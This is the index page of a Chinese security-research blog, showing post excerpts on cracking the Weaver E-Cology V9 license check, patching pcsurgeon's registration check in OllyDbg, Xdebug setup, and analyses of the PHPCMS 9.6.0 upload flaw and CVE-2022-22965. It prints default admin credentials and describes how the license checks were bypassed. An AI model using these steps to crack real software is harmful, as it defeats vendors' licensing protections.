<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Yuband&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Yuband&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Yuband">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Yuband's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Yuband's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">泛微E-Cology-V9授权认证破解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-08-29 17:29:18" itemprop="dateCreated datePublished" datetime="2023-08-29T17:29:18+08:00">2023-08-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Java逆向</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java%E9%80%86%E5%90%91/%E6%8E%88%E6%9D%83%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">授权破解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于需要复现分析该版本存在的一些漏洞，在搭好环境之后，发现需要<code>license</code>文件授权之后才可以使用，网上搜寻一番并未找到破解工具，因此选择自行破解该授权，本文仅供学习分析，请勿商用！</p>
<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CentOS Linux release 7.9.2009</span><br><span class="line">software Version：Ecology9</span><br><span class="line">Ecology path: /usr/weaver/ecology/</span><br><span class="line">Resin Path: /usr/weaver/Resin4</span><br><span class="line">后台账密: sysadmin/Weaver@2001</span><br><span class="line">默认验证码: wEAver2018</span><br></pre></td></tr></table></figure>

<h2 id="寻找入口点"><a href="#寻找入口点" class="headerlink" title="寻找入口点"></a>寻找入口点</h2><h3 id="找到license校验入口"><a href="#找到license校验入口" class="headerlink" title="找到license校验入口"></a>找到license校验入口</h3><p>进入管理员页面，输入账密进行登录：<code>sysadmin/Weaver@2001</code></p>
<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692521595225.png" alt="1692521595225"></p>
<p>此处提示没有授权，我们可以自行构造一个<code>1.license</code>文件进行测试并抓包，输入默认验证码：<code>wEAver2018</code></p>
<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1693211838563.png" alt="1693211838563"></p>
<p>可以得到如下URL：<code>http://xxx:8888/api/system/license/LicenseOperation</code></p>
<p>需要关注的字符串为<code>LicenseOperation</code>，字面意思就是对处理License信息</p>
<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1693212121940.png" alt="1693212121940"></p>
<p>进入安装根目录，使用如下命令搜索字符串<code>LicenseOperation</code>，拿到一个类文件<code>./classbean/com/engine/license/web/LicenseAction.class</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/weaver/ecology</span><br><span class="line">grep -rl LicenseOperation ./</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692522562629.png" alt="1692522562629"></p>
<p>将拿到的<code>LicenseAction.class</code>文件使用<code>fernflower</code>工具进行反编译，得到java源码</p>
<p><img src="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/1692525093673.png" alt="1692525093673"></p>
<p><code>LicenseAction.java</code>重点关注<code>LicenseOperation</code>访问路径的相关代码，然后关注引入的<code>ln.LN</code>类，其中第18行代码处的</p>
<p><code>var8 = var10.CkLicense(TimeUtil.getCurrentTimeString());</code>这里就调用了<code>ln.LN</code>类的<code>CkLicense</code>方法，后续代码则是对其返回值进行判断，显然这里是处理<code>license</code>的地方，需要在Ecology安装目录下找到这个class文件或者jar包</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/08/29/%E6%B3%9B%E5%BE%AEE-Cology-V9%E6%8E%88%E6%9D%83%E8%AE%A4%E8%AF%81%E7%A0%B4%E8%A7%A3/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/19/Linux%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88ubuntu20-04-%E5%B0%8FP%E9%9D%A2%E6%9D%BF-phpstorm_or_vscode-xdebug%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/19/Linux%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88ubuntu20-04-%E5%B0%8FP%E9%9D%A2%E6%9D%BF-phpstorm_or_vscode-xdebug%EF%BC%89/" class="post-title-link" itemprop="url">Linux下配置PHP断点调试环境（phpstorm_or_vscode+ubuntu20.04+小P面板+xdebug）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-19 15:44:19" itemprop="dateCreated datePublished" datetime="2023-06-19T15:44:19+08:00">2023-06-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">断点调试</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>Ubuntu20.04，PHPStudy_V1.29，php5.6.40，apache2.4.39，PhpStorm_2023.1.1</p>
<h2 id="小P面板-PHP-Xdebug配置"><a href="#小P面板-PHP-Xdebug配置" class="headerlink" title="小P面板 PHP Xdebug配置"></a>小P面板 PHP Xdebug配置</h2><p>安装小P面板，<a target="_blank" rel="noopener" href="https://www.xp.cn/linux.html">phpStudy Linux 面板（小皮面板）</a></p>
<p>进入小P面板，选择设置，搜索<code>xdebug</code>并启用该扩展</p>
<p><img src="/2023/06/19/Linux%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88ubuntu20-04-%E5%B0%8FP%E9%9D%A2%E6%9D%BF-phpstorm_or_vscode-xdebug%EF%BC%89/1686908783835.png" alt="1686908783835"></p>
<p><img src="/2023/06/19/Linux%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88ubuntu20-04-%E5%B0%8FP%E9%9D%A2%E6%9D%BF-phpstorm_or_vscode-xdebug%EF%BC%89/1686908815289.png" alt="1686908815289"></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/06/19/Linux%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88ubuntu20-04-%E5%B0%8FP%E9%9D%A2%E6%9D%BF-phpstorm_or_vscode-xdebug%EF%BC%89/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/18/PHPCMS9-6-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/18/PHPCMS9-6-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">PHPCMS9.6.0文件上传漏洞源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-18 00:39:11" itemprop="dateCreated datePublished" datetime="2023-03-18T00:39:11+08:00">2023-03-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">文件上传漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>PHPCMS9.6.0版本的存在文件上传漏洞，漏洞点位于phpcms&#x2F;libs&#x2F;classes&#x2F;attachment.class.php文件中，其download方法对输入参数校验不严格，导致可以绕过上传任意文件，并执行任意命令。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>Windows 10，PHP5.6.9，mysql5.7.26，phpcms9.6.0</p>
<h3 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h3><p>环境搭建可以参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44198965/article/details/107310062">phpCMS V9 史上最详细环境搭建（windows）</a>，PHPCMS9.6.0源码可以从Github下载：<a target="_blank" rel="noopener" href="https://github.com/every-easy/phpcms">GitHub-phpcms v9.6.0-源码</a></p>
<p><img src="/2023/03/18/PHPCMS9-6-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1679036904124.png" alt="1679036904124"></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/03/18/PHPCMS9-6-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/Windows%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88phpstudy-PHPStorm-Xdebug%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/17/Windows%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88phpstudy-PHPStorm-Xdebug%EF%BC%89/" class="post-title-link" itemprop="url">Windows下配置PHP断点调试环境（phpstudy+PHPStorm+Xdebug）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-17 11:04:09" itemprop="dateCreated datePublished" datetime="2023-03-17T11:04:09+08:00">2023-03-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">断点调试</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>windows 10，PHPstudy8.1.1.3，PHP5.6.9，Nginx1.15.11，PHPStorm 2022.3.3</p>
<h2 id="PHPstudy-PHP-Xdebug配置"><a href="#PHPstudy-PHP-Xdebug配置" class="headerlink" title="PHPstudy PHP Xdebug配置"></a>PHPstudy PHP Xdebug配置</h2><p>下载PHP5.6.9</p>
<p><img src="/2023/03/17/Windows%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88phpstudy-PHPStorm-Xdebug%EF%BC%89/1679019511472.png" alt="1679019511472"></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/03/17/Windows%E4%B8%8B%E9%85%8D%E7%BD%AEPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%88phpstudy-PHPStorm-Xdebug%EF%BC%89/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/12/Spring-Beans-RCE%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/12/Spring-Beans-RCE%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Spring Beans RCE（CVE-2022-22965）漏洞代码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-01-12 15:27:03" itemprop="dateCreated datePublished" datetime="2023-01-12T15:27:03+08:00">2023-01-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-01-17 16:40:09" itemprop="dateModified" datetime="2023-01-17T16:40:09+08:00">2023-01-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-web/" itemprop="url" rel="index"><span itemprop="name">Java web</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java-web/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">变量覆盖漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Beans RCE其实就是一个变量覆盖漏洞，其前身为CVE-2010-1622，CVE-2010-1622可以利用参数绑定机制对数组进行变量覆盖，使得class.classLoader.URLs[]可控，再利用渲染机制从网络获取恶意的jar包，从而执行任意命令；在JDK修复后限制了<code>beanClass</code>为<code>Class</code>和属性的<code>name</code>为<code>classLoader</code>的调用情形，导致无法绕过，但JDK9之后多了一个module，如<code>class.module.classLoader</code>，这样module就满足第一个条件，而不去判断第二个条件，从而绕过黑名单，所以该漏洞本质上是对CVE-2010-1622漏洞在新版本上的一个绕过再利用。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/01/12/Spring-Beans-RCE%EF%BC%88CVE-2022-22965%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yuband">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yuband's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">pcsurgeon程序破解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-15 10:35:14" itemprop="dateCreated datePublished" datetime="2022-10-15T10:35:14+08:00">2022-10-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/" itemprop="url" rel="index"><span itemprop="name">OllyDebug</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OllyDebug/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">逆向破解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="破解重点"><a href="#破解重点" class="headerlink" title="破解重点"></a>破解重点</h3><p>找到处理注册函数的位置，打上patch</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据程序显示的&quot;&lt;unregistered &quot;字符串，找到引用该地址的汇编代码</span><br></pre></td></tr></table></figure>

<p>破解问题</p>
<p>无法在win7运行，可能需要在XP上面跑，</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1687782371391.png" alt="1687782371391"></p>
<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><h4 id="破解一（修改判断逻辑）"><a href="#破解一（修改判断逻辑）" class="headerlink" title="破解一（修改判断逻辑）"></a>破解一（修改判断逻辑）</h4><h5 id="分析与破解过程"><a href="#分析与破解过程" class="headerlink" title="分析与破解过程"></a>分析与破解过程</h5><p>首先打开程序，看到上面显示的未注册，我们可以定位到字符串位置：<code>&lt;unregistered</code></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260038823.png" alt="1689260038823"></p>
<p>选择<code>查找</code>—&gt;<code>所有参考文本字串</code>，然后拖到最上面，右键选择<code>查找文本</code></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260124988.png" alt="1689260124988"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260227282.png" alt="1689260227282"></p>
<p>找到了符合的字符串，然后双击找到引用该字符串的位置，我们可以发现，在该处汇编的上一行明显有一个跳转判断，可以猜测若跳过下面的执行，则越过了输出未注册字样，因此在此处jnz处打上断点</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260312915.png" alt="1689260312915"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689260398316.png" alt="1689260398316"></p>
<p>重新运行，显然此处并没有跳转，而是下面获取了未注册字样，我们先尝试将标志位<code>z</code>置为0</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263390397.png" alt="1689263390397"></p>
<p>越过后，顶部的显示消失了，然后点击<code>help</code>，查看未注册是否还在显示</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263490977.png" alt="1689263490977"></p>
<p>显然还是属于未注册</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263545144.png" alt="1689263545144"></p>
<p>继续查找字符串<code>&lt;Unregistered Version&gt;</code>，同样的，也是在获取字符串的上面有一个跳转，打上断点，然后修改标注位，成功破解</p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263662688.png" alt="1689263662688"></p>
<p><img src="/2022/10/15/pcsurgeon%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3/1689263765717.png" alt="1689263765717"></p>
